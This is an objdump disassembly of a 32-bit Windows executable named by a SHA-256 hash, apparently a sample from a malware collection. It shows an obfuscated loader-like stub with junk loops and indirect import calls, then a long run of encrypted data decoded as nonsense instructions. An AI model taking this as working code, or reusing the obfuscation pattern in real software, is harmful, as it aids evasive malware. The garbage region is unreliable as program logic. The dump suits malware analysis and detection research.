
0ff9b5d6f6c55ed9cfeead24755b7e9e081f75bfc4972ac09b3b4ef83c581954.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c36
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d42
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x423842
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x423909
  4012ea:	push   0x42398d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	xor    BYTE PTR [ebx+ebx*8],cl
  401440:	jmp    0x62a276a7
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	stc    
  401456:	in     eax,0x72
  401458:	inc    edx
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	push   0xb7f466f7
  401509:	ins    BYTE PTR es:[edi],dx
  40150a:	test   eax,0x226685a0
  40150f:	mov    esp,0x8551f3c0
  401514:	xchg   ebp,eax
  401515:	mov    ch,dh
  401517:	mov    cl,0x7c
  401519:	adc    al,0x72
  40151b:	mov    eax,ds:0x3de21a9b
  401520:	stos   BYTE PTR es:[edi],al
  401521:	mov    eax,0xdc1a8d7
  401526:	icebp  
  401527:	shl    DWORD PTR [ebx+eiz*2-0x6185baa7],cl
  40152e:	test   al,0x83
  401530:	popf   
  401531:	dec    edx
  401532:	bound  ecx,QWORD PTR [ecx-0x6f]
  401535:	mov    ah,0x96
  401537:	das    
  401538:	and    ch,BYTE PTR [edx-0x1c]
  40153b:	or     cl,BYTE PTR [edi-0x3c]
  40153e:	and    DWORD PTR [ebp+0x57],0xffffffff
  401542:	pop    ebx
  401543:	push   esi
  401544:	mov    dl,0xcc
  401546:	jno    0x4014e9
  401548:	ror    DWORD PTR [ebp-0x647369e6],1
  40154e:	js     0x4015bb
  401550:	sub    dh,ch
  401552:	sbb    ecx,eax
  401554:	cdq    
  401555:	or     eax,0x60a8be86
  40155a:	dec    ebp
  40155b:	shl    DWORD PTR [esp+esi*1+0x52],0x89
  401560:	add    eax,0xeca747f7
  401565:	ins    BYTE PTR es:[edi],dx
  401566:	inc    ecx
  401567:	inc    edi
  401568:	sbb    dl,bh
  40156a:	sbb    eax,0xdd61671f
  40156f:	test   DWORD PTR [esi],edi
  401571:	clc    
  401572:	sbb    al,0x27
  401574:	and    BYTE PTR [ecx+0xb],al
  401577:	xchg   edx,eax
  401578:	xor    edi,DWORD PTR [esi]
  40157a:	out    dx,al
  40157b:	adc    ch,BYTE PTR [edi]
  40157d:	popf   
  40157e:	sar    BYTE PTR [ecx-0xe],0x64
  401582:	ins    DWORD PTR es:[edi],dx
  401583:	ds (bad) 
  401585:	scas   al,BYTE PTR es:[edi]
  401586:	arpl   ax,bx
  401588:	xchg   BYTE PTR ds:0xb95a7f07,bl
  40158e:	add    DWORD PTR [ebx-0x48d749ce],esp
  401594:	fisttp DWORD PTR ds:0xe365f71b
  40159a:	push   ebp
  40159b:	jns    0x4015f2
  40159d:	sub    ebp,ebp
  40159f:	cmp    edx,DWORD PTR [edi+0xf]
  4015a2:	push   es
  4015a3:	rep outs dx,WORD PTR ds:[esi]
  4015a6:	lods   al,BYTE PTR ds:[esi]
  4015a7:	(bad)  
  4015a8:	sbb    ch,dl
  4015aa:	scas   al,BYTE PTR es:[edi]
  4015ab:	(bad)  
  4015ad:	test   DWORD PTR [ebx+0x6f],ebx
  4015b0:	push   ecx
  4015b1:	and    eax,0x6cab9d32
  4015b6:	ret    
  4015b7:	nop
  4015b8:	rcl    DWORD PTR ds:0x89e6af11,0x3e
  4015bf:	mov    esp,0x613193b3
  4015c4:	dec    esi
  4015c5:	xchg   edx,eax
  4015c6:	adc    al,0xfb
  4015c8:	adc    BYTE PTR [ebp+0x54],cl
  4015cb:	in     eax,0x42
  4015cd:	int3   
  4015ce:	push   ebp
  4015cf:	xchg   ecx,eax
  4015d0:	ins    DWORD PTR es:[edi],dx
  4015d1:	into   
  4015d2:	mov    bh,BYTE PTR [eax+ebx*8-0x20]
  4015d6:	pop    esp
  4015d7:	ret    0xe0c9
  4015da:	xchg   ebp,eax
  4015db:	dec    esi
  4015dc:	push   0xf9c40b74
  4015e1:	jnp    0x401619
  4015e3:	xchg   BYTE PTR [ebx],dh
  4015e5:	mov    ds:0x45a4dbb9,al
  4015ea:	aam    0xeb
  4015ec:	jbe    0x40161f
  4015ee:	mov    ecx,0x1da5c037
  4015f3:	outs   dx,DWORD PTR ds:[esi]
  4015f4:	push   ecx
  4015f5:	xor    esi,esp
  4015f7:	mov    ah,0x91
  4015f9:	repnz bound esi,QWORD PTR [ebx+0x4bc32bb5]
  401600:	sbb    eax,0x8a0926b5
  401605:	jmp    DWORD PTR [eax]
  401607:	inc    ebx
  401608:	mov    cl,0x58
  40160a:	dec    ebp
  40160b:	sub    al,0x4d
  40160d:	inc    ecx
  40160e:	push   ebp
  40160f:	orps   xmm5,XMMWORD PTR [edi-0x3b]
  401613:	rcr    BYTE PTR [ebx+0x69c9a01f],0xc1
  40161a:	aas    
  40161b:	jne    0x4015d1
  40161d:	mov    ch,0xe7
  40161f:	enter  0x9a81,0xea
  401623:	aas    
  401624:	sbb    esp,DWORD PTR [esi]
  401626:	sub    BYTE PTR [ebp-0x5d1e2025],ch
  40162c:	retf   
  40162d:	ret    
  40162e:	lahf   
  40162f:	sti    
  401630:	cmp    ecx,DWORD PTR [eax-0x9]
  401633:	push   ebx
  401634:	fidiv  DWORD PTR [edi+0x201c1e67]
  40163a:	cmp    DWORD PTR [esi-0x50],0x7c
  40163e:	pop    esp
  40163f:	dec    ecx
  401640:	ret    0xf8ee
  401643:	ins    BYTE PTR es:[edi],dx
  401644:	out    dx,al
  401645:	sub    al,0x1c
  401647:	jbe    0x4016a3
  401649:	lock dec esp
  40164b:	in     al,0x55
  40164d:	push   0x44
  40164f:	cld    
  401650:	push   ecx
  401651:	std    
  401652:	outs   dx,DWORD PTR cs:[esi]
  401654:	(bad)  
  401655:	test   BYTE PTR [ecx-0x4c1f4a62],0x21
  40165c:	popa   
  40165d:	icebp  
  40165e:	enter  0xb176,0x4a
  401662:	loop   0x401662
  401664:	into   
  401665:	leave  
  401666:	add    eax,0xc9dcbc89
  40166b:	aam    0x8
  40166d:	dec    ebx
  40166e:	adc    BYTE PTR [ebp+eiz*8-0x395daf24],dl
  401675:	sbb    al,0xdb
  401677:	stos   DWORD PTR es:[edi],eax
  401678:	aaa    
  401679:	mov    al,ds:0x8c0be436
  40167e:	mov    dl,0xe2
  401680:	push   esp
  401681:	pushf  
  401682:	aaa    
  401683:	mov    BYTE PTR [ebx+0x6a],0x59
  401687:	mov    bh,0xc1
  401689:	dec    esi
  40168a:	outs   dx,DWORD PTR ds:[esi]
  40168b:	mov    esp,0x28ae6895
  401690:	in     eax,0xb5
  401692:	or     eax,DWORD PTR [ebp-0x1a]
  401695:	push   ds
  401696:	leave  
  401697:	and    al,0x8b
  401699:	cmp    ch,BYTE PTR [eax]
  40169b:	mov    DWORD PTR ds:0xcbfda0c7,0xe8c152c4
  4016a5:	cdq    
  4016a6:	xchg   ecx,eax
  4016a7:	and    dh,BYTE PTR [esi+0x1e]
  4016aa:	pop    eax
  4016ab:	sbb    al,BYTE PTR [esi]
  4016ad:	inc    edi
  4016ae:	enter  0x7b2b,0xa1
  4016b2:	xor    al,0xf6
  4016b4:	in     eax,0x4a
  4016b6:	push   ss
  4016b7:	(bad)  
  4016b8:	xor    edi,esp
  4016ba:	inc    esp
  4016bb:	dec    ebp
  4016bc:	retf   0x4e07
  4016bf:	and    DWORD PTR [esi+0x3e],ecx
  4016c2:	sub    ecx,ebp
  4016c4:	mov    ds:0x56ce1c0a,eax
  4016c9:	aas    
  4016ca:	dec    ebx
  4016cb:	sbb    DWORD PTR [esi],ebp
  4016cd:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4016cf:	sahf   
  4016d0:	(bad)  
  4016d1:	cmp    DWORD PTR [eax-0x1e88a76e],ecx
  4016d7:	or     al,0xda
  4016d9:	pop    ds
  4016da:	test   eax,0x63c4dc3c
  4016df:	adc    DWORD PTR [eax+esi*1],esp
  4016e2:	cmp    ah,ah
  4016e4:	scas   eax,DWORD PTR es:[edi]
  4016e5:	loop   0x4016fa
  4016e7:	les    edi,FWORD PTR [ecx]
  4016e9:	es int3 
  4016eb:	leave  
  4016ec:	cmp    DWORD PTR [ebx+edx*2-0x70cd850f],esi
  4016f3:	and    edx,DWORD PTR [ebx-0x80]
  4016f6:	fdivr  QWORD PTR [eax-0x21c4f08c]
  4016fc:	push   0x8524c242
  401701:	push   ebx
  401702:	jne    0x4016e3
  401704:	loopne 0x401727
  401706:	jmp    0x767:0x9394fa0e
  40170d:	mov    ebx,0x4acec49
  401712:	add    dh,BYTE PTR [ecx-0x62]
  401715:	fsub   QWORD PTR ds:0x20df1c13
  40171b:	clc    
  40171c:	(bad)  
  40171d:	sub    al,0xa8
  40171f:	fcomip st,st(7)
  401721:	jne    0x40171d
  401723:	pop    edx
  401724:	cli    
  401725:	aam    0x31
  401727:	daa    
  401728:	mov    ecx,0x91416eaf
  40172d:	jg     0x4016ec
  40172f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401730:	push   ebx
  401731:	outs   dx,BYTE PTR ds:[esi]
  401732:	call   0xc156c07c
  401737:	aaa    
  401738:	jle    0x401796
  40173a:	or     al,0x49
  40173c:	mov    ebp,0xcef00742
  401741:	jo     0x40177a
  401743:	pop    edx
  401744:	adc    eax,0x23c79255
  401749:	gs and ebp,esi
  40174c:	push   ebp
  40174d:	push   ebp
  40174e:	xchg   esi,eax
  40174f:	retf   0x618
  401752:	sub    eax,0x80e9c035
  401757:	jge    0x40170b
  401759:	jae    0x40171d
  40175b:	int    0x4e
  40175d:	cwde   
  40175e:	xchg   ebp,eax
  40175f:	fwait
  401760:	clc    
  401761:	push   es
  401762:	adc    esp,ecx
  401764:	addr16 (bad) 
  401767:	push   eax
  401768:	pop    edx
  401769:	and    ebp,DWORD PTR [ecx+eax*8+0x5edbb494]
  401770:	mov    ds:0x61fdf00f,eax
  401775:	or     eax,0xe34df58c
  40177a:	inc    edi
  40177b:	push   eax
  40177c:	dec    ebx
  40177d:	shr    esp,cl
  40177f:	(bad)  
  401780:	out    dx,al
  401781:	pop    ds
  401782:	jge    0x4017f2
  401784:	out    0x72,al
  401786:	mov    eax,ds:0xfb8e2c25
  40178b:	ret    
  40178c:	fdiv   st,st(4)
  40178e:	pop    edi
  40178f:	or     ebp,DWORD PTR [bx+di]
  401792:	mov    al,ds:0xdeb8a46d
  401797:	nop
  401798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401799:	push   ebp
  40179a:	aad    0x94
  40179c:	cld    
  40179d:	add    DWORD PTR [esi+eiz*2],ebp
  4017a0:	std    
  4017a1:	cmp    ah,BYTE PTR [edi+edi*2-0x3dac9cf5]
  4017a8:	jl     0x4017bc
  4017aa:	stc    
  4017ab:	test   eax,0x6f780531
  4017b0:	jae    0x4017a0
  4017b2:	daa    
  4017b3:	scas   al,BYTE PTR es:[edi]
  4017b4:	call   edi
  4017b6:	fmul   DWORD PTR [edi+0x1492527]
  4017bc:	call   0x4708:0x7bb181c9
  4017c3:	in     al,0x51
  4017c5:	enter  0xe8f0,0x1d
  4017c9:	xlat   BYTE PTR ds:[ebx]
  4017ca:	loop   0x4017af
  4017cc:	jbe    0x40179b
  4017ce:	xor    DWORD PTR [ebx-0x35d521e5],ebp
  4017d4:	pop    eax
  4017d5:	jecxz  0x401829
  4017d7:	mov    bl,0xf4
  4017d9:	jl     0x401846
  4017db:	mov    ebx,0xcccef2c9
  4017e0:	retf   
  4017e1:	retf   0x5ded
  4017e4:	cwde   
  4017e5:	push   es
  4017e6:	xor    BYTE PTR [esi-0x71],dh
  4017e9:	shl    dl,0x9c
  4017ec:	sbb    BYTE PTR [esi-0x7542ec57],0x3b
  4017f3:	mov    esp,DWORD PTR ds:0x2b10166d
  4017f9:	and    al,0x73
  4017fb:	cmp    eax,0x86feba6
  401800:	xchg   edx,eax
  401801:	lods   al,BYTE PTR ds:[esi]
  401802:	call   0x7736:0x92cb1b0a
  401809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40180a:	or     esi,DWORD PTR [edx]
  40180c:	pushf  
  40180d:	(bad)  
  40180e:	std    
  40180f:	mov    eax,DWORD PTR [edx-0x2a]
  401812:	mov    BYTE PTR [eax+0x4abcf246],ah
  401818:	test   edi,eax
  40181a:	ins    DWORD PTR es:[edi],dx
  40181b:	(bad)  
  40181c:	cdq    
  40181d:	outs   dx,BYTE PTR ds:[esi]
  40181e:	cli    
  40181f:	out    0x91,eax
  401821:	pop    esp
  401822:	jmp    0xdc0eb877
  401827:	jb     0x401804
  401829:	xchg   esp,eax
  40182a:	into   
  40182b:	int    0x87
  40182d:	lock fcmove st,st(3)
  401830:	repz sahf 
  401832:	out    0xcc,al
  401834:	fcom   QWORD PTR [ecx]
  401836:	push   ebx
  401837:	pop    edx
  401838:	sub    edi,ebp
  40183a:	call   0x2ef5:0x32c7d27e
  401841:	bound  esi,QWORD PTR [edi+0x4a]
  401844:	fmul   QWORD PTR [edi-0x13]
  401847:	in     eax,0x7e
  401849:	mov    bh,0x98
  40184b:	in     eax,0x77
  40184d:	xchg   esi,eax
  40184e:	xchg   ebp,eax
  40184f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401850:	push   ss
  401851:	or     esi,DWORD PTR [edx+ebx*4-0x68e62537]
  401858:	xchg   esp,eax
  401859:	dec    esp
  40185a:	int3   
  40185b:	adc    cl,BYTE PTR [ecx-0x63]
  40185e:	lea    edx,[eax]
  401860:	jno    0x4018ce
  401862:	dec    ebx
  401863:	push   edx
  401864:	add    ebp,esi
  401866:	aas    
  401867:	xchg   ecx,eax
  401868:	jo     0x4018c4
  40186a:	mov    edx,0x32fc6fa7
  40186f:	xor    dl,ch
  401871:	lds    ebp,FWORD PTR [esi]
  401873:	arpl   WORD PTR [edi+0x4a4f8eb6],bp
  401879:	ins    BYTE PTR es:[edi],dx
  40187a:	add    BYTE PTR [edx],ch
  40187c:	loop   0x401879
  40187e:	mov    DWORD PTR ds:0xef48cee5,esp
  401884:	push   cs
  401885:	jp     0x4018a7
  401887:	mov    esp,DWORD PTR [edx-0x75]
  40188a:	mov    al,ds:0x747dc355
  40188f:	or     BYTE PTR [eax+edi*2+0x526381e4],0x78
  401897:	clc    
  401898:	lods   eax,DWORD PTR fs:[esi]
  40189a:	in     al,0xd1
  40189c:	ss mov eax,0x25fc3cc9
  4018a2:	and    al,0x4f
  4018a4:	cmp    ecx,edx
  4018a6:	shl    BYTE PTR [eax-0x45],0xa
  4018aa:	dec    edx
  4018ab:	rcr    DWORD PTR [eax+edi*1+0x467ac231],0xfe
  4018b3:	sti    
  4018b4:	xchg   ebx,eax
  4018b5:	(bad)  
  4018b6:	les    ebx,FWORD PTR [ebp-0x35c760b6]
  4018bc:	xchg   ecx,eax
  4018bd:	inc    ebp
  4018be:	jnp    0x4018cf
  4018c0:	in     eax,0x62
  4018c2:	and    DWORD PTR [ebx+eiz*4],ebp
  4018c5:	push   ecx
  4018c6:	lock popf 
  4018c8:	clc    
  4018c9:	(bad)  
  4018ca:	jmp    0xd81a435e
  4018cf:	add    eax,0x9ce2b5d4
  4018d4:	ficom  WORD PTR [ebx-0x30]
  4018d7:	add    DWORD PTR [esi-0xa],esi
  4018da:	ror    DWORD PTR [ebx-0x4000e8ef],1
  4018e0:	daa    
  4018e1:	jno    0x4018a8
  4018e3:	ret    0x37dd
  4018e6:	xchg   DWORD PTR [edx-0x6],esi
  4018e9:	adc    al,0xe5
  4018eb:	leave  
  4018ec:	add    esp,0xffffffc3
  4018ef:	iret   
  4018f0:	bound  ebp,QWORD PTR [edi]
  4018f2:	inc    ebp
  4018f3:	das    
  4018f4:	or     bl,BYTE PTR [esi+0x1]
  4018f7:	inc    esi
  4018f8:	cmc    
  4018f9:	xor    dh,0x34
  4018fc:	leave  
  4018fd:	jns    0x401918
  4018ff:	fcmovnbe st,st(7)
  401901:	xchg   DWORD PTR [edx-0x33],esi
  401904:	mov    edx,DWORD PTR [ebp+0x569c5e6c]
  40190a:	push   es
  40190b:	cmp    al,0x3e
  40190d:	lahf   
  40190e:	push   edx
  40190f:	imul   ebx,DWORD PTR [esi],0x9ae09e3d
  401915:	xchg   edi,eax
  401916:	sub    BYTE PTR ds:0x2f655ade,0xef
  40191d:	ficomp WORD PTR [edx-0x1f]
  401920:	outs   dx,DWORD PTR ds:[esi]
  401921:	xchg   edi,eax
  401922:	in     al,dx
  401923:	xchg   ebp,ebp
  401925:	aas    
  401926:	dec    eax
  401927:	mov    eax,0xeb6a05dc
  40192d:	and    BYTE PTR [ecx-0x64],0x36
